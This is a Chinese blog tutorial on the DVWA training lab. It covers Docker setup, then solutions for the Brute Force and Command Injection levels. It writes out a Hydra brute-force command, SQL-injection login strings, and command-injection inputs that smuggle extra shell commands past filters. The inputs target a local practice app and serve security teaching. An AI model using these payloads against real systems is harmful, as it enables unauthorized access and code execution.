<!DOCTYPE html><html> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>DVWA 通关教程</title><link rel="icon" type="image/vnd.microsoft.icon" href="/favicon.ico"><link rel="alternate" type="application/rss+xml" title="博客文章 RSS 订阅" href="https://skywt.cn/rss.xml"><link rel="sitemap" href="/sitemap-index.xml"><title>DVWA 通关教程</title><link rel="canonical" href="https://skywt.cn/blog/dvwa-tutorial/"><meta name="description" content="**DVWA**（Damn Vulnerable Web Application，该死的易受攻击的 Web 应用）是一个用于 Web 渗透测试的靶场。这一项目基于 PHP，提供了多个常见的 Web 漏洞的经典实现，非常适合 Web 安全入门实践。（[GitHub 仓库](https://github.com/digininja/DVWA)）

DVWA 的每个漏洞（vulnerability）分为四个安全等级（也代表攻击难度）：

* **Low**：完全没有安全措施。
* **Medium**：不良的安全实践。
* **High**：（或许更难攻击的）不良安全实践。
* **Impossible**：安全的实践。

"><meta name="robots" content="index, follow"><meta property="og:title" content="DVWA 通关教程"><meta property="og:type" content="article"><meta property="og:image" content="/og.svg"><meta property="og:url" content="https://skywt.cn/blog/dvwa-tutorial/"><meta property="og:locale" content="zh_CN"><meta property="og:locale:alternate" content="zh_TW"><meta property="og:locale:alternate" content="en_US"><meta property="og:site_name" content="SkyWT"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@skywt2003"><meta name="twitter:title" content="DVWA 通关教程"><meta name="twitter:image" content="/og.svg"><meta name="twitter:image:alt" content="SkyWT"><meta name="twitter:description" content="**DVWA**（Damn Vulnerable Web Application，该死的易受攻击的 Web 应用）是一个用于 Web 渗透测试的靶场。这一项目基于 PHP，提供了多个常见的 Web 漏洞的经典实现，非常适合 Web 安全入门实践。（[GitHub 仓库](https://github.com/digininja/DVWA)）

DVWA 的每个漏洞（vulnerability）分为四个安全等级（也代表攻击难度）：

* **Low**：完全没有安全措施。
* **Medium**：不良的安全实践。
* **High**：（或许更难攻击的）不良安全实践。
* **Impossible**：安全的实践。

"><meta name="twitter:creator" content="@skywt2003"><link rel="shortcut icon" href="/favicon.ico"><link rel="bookmark" href="/favicon.ico"><link rel="apple-touch-icon" href="/avatar.png"><meta name="generator" content="Astro v4.14.2"><meta name="keywords" content="DVWA,通关,教程,靶场,漏洞,ctf"><script>
      function addMatomo() {
        var _paq = (window._paq = window._paq || []);
        _paq.push(["trackPageView"]);
        _paq.push(["enableLinkTracking"]);
        (function () {
          var u = "//analytics.skywt.cn/";
          _paq.push(["setTrackerUrl", u + "matomo.php"]);
          _paq.push(["setSiteId", "1"]);
          var d = document,
            g = d.createElement("script"),
            s = d.getElementsByTagName("script")[0];
          g.async = true;
          g.src = u + "matomo.js";
          s.parentNode.insertBefore(g, s);
        })();
      }

      document.addEventListener(
        "astro:page-load",
        () => {
          addMatomo();
        },
        { once: false },
      );
    </script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><link rel="stylesheet" href="/_astro/about.Bz1ZbssJ.css">
<link rel="stylesheet" href="/_astro/about.C9eFCau8.css"><script type="module" src="/_astro/hoisted.CDGpIg0b.js"></script></head> <body> <header class="header"> <h5 class="header__heading"> <a href="/" class="link">SkyWT</a> <span>
/
<a href="/blog" class="link"> 博客 </a> </span><span>
/
DVWA 通关教程 </span> </h5> </header> <div id="navbar-sentinal"></div> <nav class="navbar" id="navbar-wrapper"> <div class="navbar__content"> <h5 class="navbar__path"> <a href="/" class="link">SkyWT</a> <span>
/
<a href="/blog" class="link"> 博客 </a> </span><span>
/
DVWA 通关教程 </span> </h5> <div class="navbar__menu"> <ul data-astro-cid-tfcnbjmv> <li data-astro-cid-tfcnbjmv> <a class="link" href="/" data-astro-cid-tfcnbjmv> <i class="ri-home-line" data-astro-cid-tfcnbjmv></i>
主页
</a> </li> <li data-astro-cid-tfcnbjmv> <a class="link" href="/blog" data-astro-cid-tfcnbjmv> <i class="ri-newspaper-line" data-astro-cid-tfcnbjmv></i> 博客 </a> </li><li data-astro-cid-tfcnbjmv> <a class="link" href="/lab" data-astro-cid-tfcnbjmv> <i class="ri-server-line" data-astro-cid-tfcnbjmv></i> 实验室 </a> </li><li data-astro-cid-tfcnbjmv> <a class="link" href="/friends" data-astro-cid-tfcnbjmv> <i class="ri-contacts-line" data-astro-cid-tfcnbjmv></i> 友人 </a> </li><li data-astro-cid-tfcnbjmv> <a class="link" href="/about" data-astro-cid-tfcnbjmv> <i class="ri-cup-line" data-astro-cid-tfcnbjmv></i> 关于 </a> </li> </ul>  </div> </div> </nav> <script>
  // 使用 ViewTransition 后，所有 DOM 操作的 js 都有一堆问题
  // 这里用了极不优雅的 var，有待改进
  var observer;
  function addNavObserver() {
    const headerEl = document.querySelector("#navbar-wrapper");
    const sentinalEl = document.querySelector("#navbar-sentinal");
    if (!sentinalEl || !headerEl) return;
    observer = new window.IntersectionObserver((e) => {
      if (!e[0].isIntersectin && e[0].boundingClientRect.top <= 0) {
        headerEl.classList.add("navbar--sticked");
      } else {
        headerEl.classList.remove("navbar--sticked");
      }
    });
    observer.observe(sentinalEl);
  }

  function removeNavObserver() {
    if (observer) observer.disconnect();
    observer = null;
  }

  document.addEventListener(
    "astro:page-load",
    () => {
      addNavObserver();
    },
    { once: false },
  );

  document.addEventListener(
    "astro:before-swap",
    () => {
      removeNavObserver();
    },
    { once: false },
  );
</script>  <main class="page"> <section class="page__section page__section--at-top">  <h1 class="page__heading">DVWA 通关教程</h1> <p class="page__meta"> <i class="ri-calendar-line"></i> <span>2024 年 5 月 8 日 07:30</span>  </p> <hr class="page__divide"> <article class="content"> <h2><a id="文章目录" class="content__heading-anchor"></a>文章目录</h2>
<ul>
<li><a href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">环境配置</a>
<ul>
<li><a href="#%E4%BD%BF%E7%94%A8-docker-compose-%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83">使用 Docker Compose 搭建环境</a></li>
<li><a href="#%E9%85%8D%E7%BD%AE-recaptcha">配置 reCAPTCHA</a></li>
</ul></li>
<li><a href="#brute-force">Brute Force</a>
<ul>
<li><a href="#low%E7%AE%80%E5%8D%95%E6%9A%B4%E5%8A%9B">Low：简单暴力</a></li>
<li><a href="#medium%E7%AD%89%E5%BE%85%E6%97%B6%E9%97%B4">Medium：等待时间</a></li>
<li><a href="#high%E9%9A%8F%E6%9C%BA%E7%AD%89%E5%BE%85%E6%97%B6%E9%97%B4--csrf-%E9%98%B2%E6%8A%A4">High：随机等待时间 &amp; CSRF 防护</a></li>
<li><a href="#impossible%E8%B4%A6%E6%88%B7%E9%94%81%E5%AE%9A">Impossible：账户锁定</a></li>
</ul></li>
<li><a href="#command-injection">Command Injection</a>
<ul>
<li><a href="#low%E4%B8%8D%E8%BF%87%E6%BB%A4">Low：不过滤</a></li>
<li><a href="#medium%E7%AE%80%E5%8D%95%E8%BF%87%E6%BB%A4">Medium：简单过滤</a></li>
<li><a href="#high%E6%9B%B4%E5%A4%9A%E8%BF%87%E6%BB%A4">High：更多过滤</a></li>
<li><a href="#impossible%E7%99%BD%E5%90%8D%E5%8D%95">Impossible：白名单</a></li>
</ul></li>
<li><a href="#cross-site-request-forgery-csrf">Cross Site Request Forgery (CSRF)</a>
<ul>
<li><a href="#low%E6%97%A0%E9%98%B2%E6%8A%A4">Low：无防护</a></li>
<li><a href="#medium%E5%88%A4%E6%96%AD-referer">Medium：判断 referer</a></li>
<li><a href="#highcsrf-token">High：CSRF token</a></li>
<li><a href="#impossible%E6%8F%90%E4%BE%9B%E5%8E%9F%E5%AF%86%E7%A0%81">Impossible：提供原密码</a></li>
</ul></li>
<li><a href="#file-inclusion">File Inclusion</a>
<ul>
<li><a href="#low%E6%97%A0%E9%98%B2%E6%8A%A4-1">Low：无防护</a></li>
<li><a href="#medium%E5%85%B3%E9%94%AE%E8%AF%8D%E8%BF%87%E6%BB%A4">Medium：关键词过滤</a></li>
<li><a href="#high%E5%8F%AA%E8%83%BD%E6%98%AF%E6%96%87%E4%BB%B6">High：只能是文件</a></li>
<li><a href="#impossible%E7%99%BD%E5%90%8D%E5%8D%95-1">Impossible：白名单</a></li>
</ul></li>
<li><a href="#file-upload">File Upload</a>
<ul>
<li><a href="#low%E6%97%A0%E9%98%B2%E6%8A%A4-2">Low：无防护</a></li>
<li><a href="#medium%E9%99%90%E5%88%B6-mime">Medium：限制 MIME</a></li>
<li><a href="#high%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E6%8B%93%E5%B1%95%E5%90%8D">High：限制文件拓展名</a></li>
<li><a href="#impossible%E5%9B%BE%E7%89%87%E9%87%8D%E6%96%B0%E7%BC%96%E7%A0%81">Impossible：图片重新编码</a></li>
</ul></li>
<li><a href="#insecure-captcha">Insecure CAPTCHA</a>
<ul>
<li><a href="#low%E6%B2%A1%E7%94%A8%E7%9A%84-step-%E9%AA%8C%E8%AF%81">Low：没用的 step 验证</a></li>
<li><a href="#medium%E5%8F%88%E4%B8%80%E4%B8%AA%E6%B2%A1%E7%94%A8%E7%9A%84%E9%AA%8C%E8%AF%81">Medium：又一个没用的验证</a></li>
<li><a href="#high%E5%BC%80%E5%8F%91%E8%80%85%E7%95%99%E7%9A%84%E5%90%8E%E9%97%A8">High：开发者留的后门</a></li>
<li><a href="#impossible%E6%AD%A3%E5%B8%B8%E5%9C%B0%E4%BD%BF%E7%94%A8">Impossible：正常地使用</a></li>
</ul></li>
<li><a href="#sql-injection">SQL Injection</a>
<ul>
<li><a href="#low%E6%97%A0%E9%98%B2%E6%8A%A4-3">Low：无防护</a></li>
<li><a href="#medium%E5%AD%97%E7%AC%A6%E8%BD%AC%E4%B9%89">Medium：字符转义</a></li>
<li><a href="#high%E5%8D%95%E7%8B%AC%E7%9A%84%E9%A1%B5%E9%9D%A2">High：单独的页面</a></li>
<li><a href="#impossible%E9%99%90%E5%88%B6%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B--%E9%A2%84%E7%BC%96%E8%AF%91">Impossible：限制数据类型 &amp; 预编译</a></li>
</ul></li>
<li><a href="#sql-injection-blind">SQL Injection (Blind)</a></li>
<li><a href="#weak-session-ids">Weak Session IDs</a>
<ul>
<li><a href="#low%E7%AE%80%E5%8D%95%E8%AE%A1%E6%95%B0%E5%99%A8">Low：简单计数器</a></li>
<li><a href="#medium%E6%97%B6%E9%97%B4%E6%88%B3">Medium：时间戳</a></li>
<li><a href="#high%E8%AE%A1%E6%95%B0%E5%99%A8-md5--%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6">High：计数器 MD5 &amp; 访问限制</a></li>
<li><a href="#impossible%E9%9A%8F%E6%9C%BA%E5%8C%96--%E5%BC%BA%E9%99%90%E5%88%B6">Impossible：随机化 &amp; 强限制</a></li>
</ul></li>
<li><a href="#dom-based-cross-site-scripting-xss">DOM Based Cross Site Scripting (XSS)</a>
<ul>
<li><a href="#low%E8%99%9A%E5%81%87%E7%9A%84%E4%B8%8B%E6%8B%89%E6%A1%86">Low：虚假的下拉框</a></li>
<li><a href="#medium%E5%90%8E%E7%AB%AF%E8%BF%87%E6%BB%A4-script-%E6%A0%87%E7%AD%BE">Medium：后端过滤 script 标签</a></li>
<li><a href="#high%E5%90%8E%E7%AB%AF%E7%99%BD%E5%90%8D%E5%8D%95%E4%BD%86%E5%89%8D%E7%AB%AF%E7%AE%80%E5%8D%95%E7%B2%97%E6%9A%B4">High：后端白名单，但前端简单粗暴</a></li>
<li><a href="#impossible%E5%89%8D%E7%AB%AF%E4%B8%8D%E8%A6%81-decode">Impossible：前端不要 decode</a></li>
</ul></li>
<li><a href="#reflected-cross-site-scripting-xss">Reflected Cross Site Scripting (XSS)</a>
<ul>
<li><a href="#low%E6%97%A0%E9%98%B2%E6%8A%A4-4">Low：无防护</a></li>
<li><a href="#medium%E5%AD%90%E4%B8%B2%E6%9B%BF%E6%8D%A2">Medium：子串替换</a></li>
<li><a href="#high%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%9B%BF%E6%8D%A2">High：正则表达式替换</a></li>
<li><a href="#impossiblehtmlspecialchars">Impossible：htmlspecialchars</a></li>
</ul></li>
<li><a href="#stored-cross-site-scripting-xss">Stored Cross Site Scripting (XSS)</a>
<ul>
<li><a href="#low%E6%97%A0%E9%98%B2%E6%8A%A4-5">Low：无防护</a></li>
<li><a href="#mediumname-%E5%AD%90%E4%B8%B2%E6%9B%BF%E6%8D%A2">Medium：name 子串替换</a></li>
<li><a href="#highname-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%9B%BF%E6%8D%A2">High：name 正则表达式替换</a></li>
<li><a href="#impossiblehtmlspecialchars-1">Impossible：htmlspecialchars</a></li>
</ul></li>
<li><a href="#content-security-policy-csp-bypass">Content Security Policy (CSP) Bypass</a>
<ul>
<li><a href="#low%E5%BC%95%E7%94%A8-script-%E7%9A%84%E9%99%90%E5%88%B6">Low：引用 script 的限制</a></li>
<li><a href="#medium%E4%B8%8D%E5%8F%98%E7%9A%84-nonce">Medium：不变的 nonce</a></li>
<li><a href="#highjsonp">High：JSONP</a></li>
<li><a href="#impossible%E7%A1%AC%E7%BC%96%E7%A0%81%E5%87%BD%E6%95%B0%E5%90%8D">Impossible：硬编码函数名</a></li>
</ul></li>
<li><a href="#javascript-attacks">JavaScript Attacks</a>
<ul>
<li><a href="#low%E5%86%85%E8%81%94%E8%84%9A%E6%9C%AC">Low：内联脚本</a></li>
<li><a href="#medium%E5%A4%96%E9%83%A8%E8%84%9A%E6%9C%AC%E7%AE%80%E5%8D%95%E6%B7%B7%E6%B7%86">Medium：外部脚本，简单混淆</a></li>
<li><a href="#high%E9%AB%98%E7%BA%A7%E6%B7%B7%E6%B7%86">High：高级混淆</a></li>
<li><a href="#impossible%E4%B8%8D%E8%A6%81%E7%9B%B8%E4%BF%A1%E5%89%8D%E7%AB%AF%E5%8F%91%E6%9D%A5%E7%9A%84%E4%BB%BB%E4%BD%95%E6%95%B0%E6%8D%AE">Impossible：不要相信前端发来的任何数据</a></li>
</ul></li>
<li><a href="#authorisation-bypass">Authorisation Bypass</a>
<ul>
<li><a href="#low%E6%97%A0%E9%98%B2%E6%8A%A4-6">Low：无防护</a></li>
<li><a href="#mediumui-%E4%B8%8D%E8%AE%A9%E8%BF%9B%E6%8E%A5%E5%8F%A3%E8%BF%98%E8%83%BD%E7%94%A8">Medium：UI 不让进，接口还能用</a></li>
<li><a href="#high%E4%BF%AE%E6%94%B9%E6%8E%A5%E5%8F%A3%E4%BB%8D%E5%8F%AF%E7%94%A8">High：修改接口仍可用</a></li>
<li><a href="#impossible%E5%85%A8%E9%83%A8%E9%89%B4%E6%9D%83">Impossible：全部鉴权</a></li>
</ul></li>
<li><a href="#open-http-redirect">Open HTTP Redirect</a>
<ul>
<li><a href="#low%E7%9B%B4%E6%8E%A5%E9%87%8D%E5%AE%9A%E5%90%91">Low：直接重定向</a></li>
<li><a href="#medium%E4%B8%8D%E8%83%BD%E5%90%AB%E6%9C%89%E5%8D%8F%E8%AE%AE%E5%90%8D">Medium：不能含有协议名</a></li>
<li><a href="#high%E5%BF%85%E9%A1%BB%E5%8C%85%E5%90%AB%E5%AD%90%E4%B8%B2">High：必须包含子串</a></li>
<li><a href="#impossible%E7%99%BD%E5%90%8D%E5%8D%95-2">Impossible：白名单</a></li>
</ul></li>
<li><a href="#%E6%80%BB%E7%BB%93web-%E5%AE%89%E5%85%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5">总结：Web 安全的一些最佳实践</a></li>
</ul>
<p><strong>DVWA</strong>（Damn Vulnerable Web Application，该死的易受攻击的 Web 应用）是一个用于 Web 渗透测试的靶场。这一项目基于 PHP，提供了多个常见的 Web 漏洞的经典实现，非常适合 Web 安全入门实践。（<a href="https://github.com/digininja/DVWA">GitHub 仓库</a>）</p>
<p>DVWA 的每个漏洞（vulnerability）分为四个安全等级（也代表攻击难度）：</p>
<ul>
<li><strong>Low</strong>：完全没有安全措施。</li>
<li><strong>Medium</strong>：不良的安全实践。</li>
<li><strong>High</strong>：（或许更难攻击的）不良安全实践。</li>
<li><strong>Impossible</strong>：安全的实践。</li>
</ul>
<!--more-->
<h2><a id="环境配置" class="content__heading-anchor"></a>环境配置</h2>
<p>我的运行环境是 macOS。接下来，我们使用 Docker 部署实验环境。</p>
<h3><a id="使用-docker-compose-搭建环境" class="content__heading-anchor"></a>使用 Docker Compose 搭建环境</h3>
<p>这个项目的 GitHub 上<a href="https://github.com/digininja/DVWA/pkgs/container/dvwa">预构建的镜像</a>，都是 linux/amd64 平台，不方便在我 macOS 的 linux/arm64/v8 平台下运行（或许要通过 Rosetta）。因此，我们选择克隆代码仓库，在本地构建镜像。</p>
<pre><code class="language-bash">git <span class="hljs-built_in">clone</span> git@github.com:digininja/DVWA.git
</code></pre>
<p>仓库中其实已经包含了 <code>compose.yml</code> 文件，不过为了满足自己的需求，我还是重新写了一个 compose 文件。</p>
<p>除了 MySQL（MariaDB）数据库以外，为了方便起见，再部署一个 phpMyAdmin 来查看和管理数据库内容（毕竟干啥都要写 SQL 太不直观了）。最终 <code>compose.yml</code> 文件如下：</p>
<pre><code class="language-yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">“3”</span>

<span class="hljs-attr">services:</span>
  <span class="hljs-attr">dvwa:</span>
    <span class="hljs-attr">build:</span> <span class="hljs-string">.</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_SERVER=mariadb</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">mariadb</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">config:/var/www/html/config</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">dvwa</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;127.0.0.1:80:80&quot;</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
  <span class="hljs-attr">mariadb:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">mariadb:11.3.2</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">MARIADB_ROOT_PASSWORD=v556jYVdMsVp5rox</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">MARIADB_DATABASE=dvwa</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">MARIADB_USER=dvwa</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">MARIADB_PASSWORD=p@ssw0rd</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">database:/var/lib/mysql</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">dvwa</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
  <span class="hljs-attr">phpmyadmin:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">phpmyadmin:5.2.1</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">PMA_HOST=mariadb</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">mariadb</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">dvwa</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;127.0.0.1:8080:80&quot;</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>

<span class="hljs-attr">networks:</span>
  <span class="hljs-attr">dvwa:</span>

<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">config:</span>
  <span class="hljs-attr">database:</span>
</code></pre>
<p><strong>💡 提示：自己构建镜像是更好的选择。</strong>网上很多使用 Docker 部署 DVWA 的文章，使用 DockerHub 上 <code>vulnerables/web-dvwa</code> 这个镜像。这个镜像最近的更新日期已经是五年前了，不推荐使用。相比之下，自己从官方的 repo 里构建是更好的选择。</p>
<p>使用 <code>docker compose up -d</code> 就能构建容器并启动。</p>
<pre><code>[+] Running 3/6
 ⠦ Network dvwa_dvwa            Created                              0.6s 
 ⠦ Volume &quot;dvwa_config&quot;         Created                              0.5s 
 ⠦ Volume &quot;dvwa_database&quot;       Created                              0.5s 
 ✔ Container dvwa-mariadb-1     Started                              0.3s 
 ✔ Container dvwa-phpmyadmin-1  Started                              0.5s 
 ✔ Container dvwa-dvwa-1        Started                              0.5s 
</code></pre>
<p><strong>⚠️ 注意：在开启之前，检查系统端口占用情况。</strong>macOS 默认会安装 httpd，这个服务可能会被某些软件（疑似 Tailscale）开启，占用 80 端口。即使容器跑起来之后，访问 <code>localhost</code> 只能看到莫名其妙的一行「It works! 」提示。这种情况下，要么关闭 httpd，要么更改容器映射的端口。</p>
<p>现在，访问 <code>localhost</code>，能看到 DVWA 的登录页面，这代表服务成功跑起来了：</p>
<p><a href="https://blog.skywt.cn/usr/uploads/2024/05/1185019003.png" data-fancybox data-caption="DVWA 登录页面"><img src="https://blog.skywt.cn/usr/uploads/2024/05/1185019003.png" alt="DVWA 登录页面" title="DVWA 登录页面" /></a></p>
<p>此时还没创建数据库，可以访问 <code>localhost/setup.php</code> 进行初始化检查，并创建数据库：</p>
<p><a href="https://blog.skywt.cn/usr/uploads/2024/05/2381126624.png" data-fancybox data-caption="DVWA Setup 页面"><img src="https://blog.skywt.cn/usr/uploads/2024/05/2381126624.png" alt="DVWA Setup 页面" title="DVWA Setup 页面" /></a></p>
<p>可以看到所有 PHP 相关的配置都默认 OK 了，无需我们手动调整。这就是使用 Docker 部署的好处。</p>
<p>创建数据库后，回到登录页面，使用默认用户名 <code>admin</code> 和默认密码 <code>password</code> 即可登录。</p>
<p>此外，访问 <code>localhost:8080</code>，可以看到 phpMyAdmin 的登录页面。使用 root 用户登录，即可方便地查看、编辑数据库。</p>
<h3><a id="配置-recaptcha" class="content__heading-anchor"></a>配置 reCAPTCHA</h3>
<p>DVWA 包含 Insecure CAPTCHA 这个实验，要用到 Google 的 reCAPTCHA。这是一种机器人检测工具，就是「给一堆图片让我们选出其中的摩托车」这类的验证器。</p>
<p>为了使用 Google reCAPTCHA，我们需要在<a href="https://www.google.com/recaptcha/admin/create">这个页面</a>注册一个新的站点，申请 public key 和 private key：</p>
<p><a href="https://blog.skywt.cn/usr/uploads/2024/05/1012265525.png" data-fancybox data-caption="DVWA 申请页面"><img src="https://blog.skywt.cn/usr/uploads/2024/05/1012265525.png" alt="DVWA 申请页面" title="DVWA 申请页面" /></a></p>
<p>「reCAPTCHA type」其实是要选择版本，v2 版本是要对用户请求发起质询的，v3 版本则是在使用时根据用户行为打分。建议选择 v2 的「&quot;I'm not a robot&quot; Checkbox」版本，这个版本最直观。别忘了在下面的「Domains」里加入 <code>localhost</code>。</p>
<p>提交之后会得到 public key 和 private key，需要将这两个 key 填入 DVWA 的配置文件。刚才在 compose 文件中我们已经将配置文件目录挂载到名为 <code>config</code> 的 volume 中，只要找到其中的 <code>config.inc.php</code> 并填写即可。</p>
<p>由于众所周知的原因，reCAPTCHA 的默认服务器在国内无法访问，而我们的容器中的 PHP 进程需要访问其服务器才能验证 reCAPTCHA。解决方案是将 www.google.com 替换成不用代理即可访问的镜像站 www.recaptcha.net。需要修改的是 <code>/var/www/html/external/recaptcha/recaptchalib.php</code> 中的 url 变量。</p>
<p>配置完成后，打开 Insecure CAPTCHA 这一关进行测试，在 impossible 难度下能够正常修改密码，就代表配置成功。</p>
<h2><a id="brute-force" class="content__heading-anchor"></a>Brute Force</h2>
<p>这一关提供了一个简单的登录场景。</p>
<p><strong>攻击者的目标是：</strong>通过脚本结合字典爆破出密码。</p>
<p>事实上，这个登录表单和 DVWA 程序登录表单用的是同一个数据表，所以登录组合之一是 <code>admin</code> 和 <code>password</code>。在表中，还有若干其他用户。</p>
<h3><a id="low简单暴力" class="content__heading-anchor"></a>Low：简单暴力</h3>
<p>这一级别没有任何防御。并且有个非常逆天的设计：<strong>使用 GET 请求明文提交表单</strong>。测试使用 testuser 和 testpass 登录，发现 URL 直接变成：</p>
<pre><code>http://localhost/vulnerabilities/brute/?username=testuser&amp;password=testpass&amp;Login=Login#
</code></pre>
<p>可以自己写 shell 脚本爆破，也可以用 Hydra 工具爆破。注意：发请求的时候，要带上 cookie，否则 DVWA 程序会要求你登录。</p>
<pre><code class="language-bash">hydra -f -L ./Usernames/top-usernames-shortlist.txt -P ./Passwords/2020-200_most_used_passwords.txt -v localhost http-get-form <span class="hljs-string">&quot;/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=incorrect:H=Cookie\: security=low; PHPSESSID=0lc3tfkicmfiebe1og7vqej77q&quot;</span>
</code></pre>
<p>也可以用 BurpSuite Intruder。在「Options」、「Grep - Match」里添加「incorrect」关键词，方便识别得到的结果是否成功。</p>
<p>或者也可以用所谓的「万能密码」，也就是 SQL 注入，用户名写 <code>admin';#</code>  甚至 <code>' OR 1 = 1 LIMIT 1;#</code> 就行。当然这个考点就不是 Brute Force 了。</p>
<h3><a id="medium等待时间" class="content__heading-anchor"></a>Medium：等待时间</h3>
<p>和 low 的区别在于：</p>
<ul>
<li>对用户名、密码字符串做了转义（不能 SQL 注入了）。</li>
<li>如果错误，需要等待 2 秒才会返回结果。</li>
</ul>
<p>同样用 Hydra 或者 BurpSuite Intruder，用和上面一样的方法，可以完成爆破，只是比 low 要慢一些。</p>
<p>事实上，可以假设在网络延迟正常的情况下，如果密码正确，返回结果时间一般不会慢于 0.5 秒（这个阈值可以根据网络延迟调整）。所以，当一次尝试等待时间超过了 0.5 秒，可以直接认为密码错误而停止等待。这样可以节省不少时间。</p>
<h3><a id="high随机等待时间--csrf-防护" class="content__heading-anchor"></a>High：随机等待时间 &amp; CSRF 防护</h3>
<p>和 medium 的区别在于：</p>
<ul>
<li>如果密码错误，等待随机 0～3 秒才返回。</li>
<li>表单中增加了隐藏的 input 组件 <code>user_token</code>，值为每次随机的字符串，用于防止 CSRF 攻击。</li>
</ul>
<p>添加了 token 只是略微增加了我们爆破的复杂性：每一个登录请求都必须对应一个对表单的请求。可以使用 BurpSuite 的「Grep - Extract」功能提取 token，用 Pitchfork 模式逐一尝试。</p>
<p><a href="https://blog.skywt.cn/usr/uploads/2024/05/3106872127.png" data-fancybox data-caption="截屏2022-08-03 17.44.14.png"><img src="https://blog.skywt.cn/usr/uploads/2024/05/3106872127.png" alt="截屏2022-08-03 17.44.14.png" title="截屏2022-08-03 17.44.14.png" /></a></p>
<h3><a id="impossible账户锁定" class="content__heading-anchor"></a>Impossible：账户锁定</h3>
<p>在 high 的基础上：</p>
<ul>
<li>使用 POST 提交表单。</li>
<li>在后端（数据库中）记录了<strong>用户尝试错误的次数、上次登录时间</strong>，如果连续三次密码错误，账户锁定 15 分钟。</li>
</ul>
<p>有了尝试三次账户锁定，暴力就基本上无法快速爆破特定账户了。</p>
<h2><a id="command-injection" class="content__heading-anchor"></a>Command Injection</h2>
<p>这一关可以视为 Remote Code Execution（RCE）攻击的一个应用。提供的场景是：提供一个表单，接收用户输入的 IP 地址，在服务器上使用 PHP 的 <code>exec()</code> 执行 ping 命令，并返回输出的结果。</p>
<p><strong>攻击者的目标是：</strong>在服务器上执行任意我们想要的命令。</p>
<h3><a id="low不过滤" class="content__heading-anchor"></a>Low：不过滤</h3>
<p>在后端直接将 <code>ping</code> 命令拼接上我们输入的字符串，然后执行。那么，用 <code>&amp;&amp;</code> 或者 <code>;</code> 就可以结束之前的命令，添加任意命令。比如：</p>
<pre><code>127.0.0.1; ls -al
</code></pre>
<h3><a id="medium简单过滤" class="content__heading-anchor"></a>Medium：简单过滤</h3>
<p>在 low 的基础上，做了 <code>&amp;&amp;</code> 和 <code>;</code> 的检测，在字符串中将它们删除。</p>
<p>能够做命令注入的不止上面两种字符，还可以用管道符 <code>|</code>。这个符号本来的用法是将上一个命令的输出作为下一个命令的输入。</p>
<pre><code>127.0.0.1 | ls -al
</code></pre>
<h3><a id="high更多过滤" class="content__heading-anchor"></a>High：更多过滤</h3>
<p>替换了不少字符：</p>
<pre><code class="language-php">    <span class="hljs-comment">// Set blacklist</span>
    <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(
        <span class="hljs-string">&#x27;&amp;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,
        <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,
        <span class="hljs-string">&#x27;| &#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,
        <span class="hljs-string">&#x27;-&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,
        <span class="hljs-string">&#x27;$&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,
        <span class="hljs-string">&#x27;(&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,
        <span class="hljs-string">&#x27;)&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,
        <span class="hljs-string">&#x27;`&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,
        <span class="hljs-string">&#x27;||&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,
    ); 
</code></pre>
<p>仔细观察，过滤的不是管道符这个字符，而是管道符加一个空格……所以用 <code>127.0.0.1 |ls</code> 这种还是可以的。</p>
